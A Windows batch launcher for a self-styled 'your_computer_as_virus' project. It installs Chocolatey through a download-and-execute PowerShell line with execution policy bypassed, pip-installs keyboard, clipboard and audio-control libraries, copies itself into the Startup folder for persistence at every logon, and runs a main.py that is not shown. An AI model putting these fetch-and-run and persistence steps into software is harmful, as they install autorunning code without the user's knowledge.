@echo off

REM Check if Python is installed
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo Python is not installed. Installing Python...

    REM Check if Chocolatey is installed
    choco -v >nul 2>&1
    if %errorlevel% neq 0 (
        echo Chocolatey is not installed. Installing Chocolatey...
        @powershell -NoProfile -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))"
    )

    REM Install Python using Chocolatey
    choco install python -y
    refreshenv
)

REM Install required Python packages
pip install pyperclip keyboard pycaw comtypes

REM Get the directory of the current script
set SCRIPT_DIR=%~dp0

REM Copy the script to the startup folder
set STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
copy "%SCRIPT_DIR%your_computer_as_virus.bat" "%STARTUP_FOLDER%"

REM Run the main Python script
python "%SCRIPT_DIR%src\main.py"